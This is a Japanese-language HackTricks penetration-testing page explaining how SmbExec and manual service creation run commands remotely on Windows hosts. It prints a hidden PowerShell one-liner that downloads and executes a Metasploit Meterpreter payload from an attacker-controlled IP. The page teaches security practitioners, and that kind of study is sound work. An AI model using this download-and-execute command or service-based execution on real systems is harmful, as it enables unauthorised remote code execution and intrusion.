# SmbExec/ScExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのスワッグ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

## 動作原理

**SmbexecはPsexecのように動作します。** この例では、被害者の内部に悪意のある実行可能ファイルを指定する代わりに、**cmd.exeまたはpowershell.exe**を指定し、そのいずれかがバックドアをダウンロードして実行します。

## **SMBExec**

攻撃者とターゲットの側から見たときに、smbexecが実行されると何が起こるかを見てみましょう：

![](../../.gitbook/assets/smbexec\_prompt.png)

したがって、私たちは「BTOBTO」というサービスが作成されることを知っています。しかし、`sc query`を実行したときにそのサービスはターゲットマシンに存在しません。システムログには何が起こったかの手がかりがあります：

![](../../.gitbook/assets/smbexec\_service.png)

サービスファイル名には、実行するコマンド文字列が含まれています（%COMSPEC%はcmd.exeの絶対パスを指します）。コマンドをバッチファイルにエコーし、stdoutとstderrを一時ファイルにリダイレクトし、バッチファイルを実行して削除します。Kaliに戻ると、PythonスクリプトがSMB経由で出力ファイルを取得し、内容を「疑似シェル」に表示します。私たちの「シェル」に入力するたびに、新しいサービスが作成され、プロセスが繰り返されます。これは、バイナリをドロップする必要がないため、各所望のコマンドを新しいサービスとして実行するだけです。確かによりステルス性が高いですが、実行されたコマンドごとにイベントログが作成されることに注意してください。非対話型の「シェル」を取得する非常に賢い方法です！

## 手動SMBExec

**またはサービスを介してコマンドを実行する**

smbexecが示したように、バイナリが必要なく、サービスのbinPathから直接コマンドを実行することができます。これは、ターゲットのWindowsマシンで単に任意のコマンドを実行する必要がある場合に便利なトリックです。簡単な例として、バイナリのないリモートサービスを使用してMeterpreterシェルを取得しましょう。

Metasploitの`web_delivery`モジュールを使用し、逆向きのMeterpreterペイロードを持つPowerShellターゲットを選択します。リスナーが設定され、ターゲットマシンで実行するコマンドが表示されます：
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
```
Windowsの攻撃ボックスから、リモートサービス（"metpsh"）を作成し、binPathを使用してペイロードを実行するためにcmd.exeを設定します。

![](../../.gitbook/assets/sc\_psh\_create.png)

そして、それを起動します。

![](../../.gitbook/assets/sc\_psh\_start.png)

サービスが応答しないためエラーが発生しますが、Metasploitのリスナーを確認すると、コールバックが行われ、ペイロードが実行されたことがわかります。

すべての情報はここから抽出されました：[https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、**PEASSの最新バージョンを入手したり、HackTricksをPDFでダウンロード**したいですか？ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう

- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。

- **ハッキングのトリックを共有するには、[hacktricksのリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudのリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
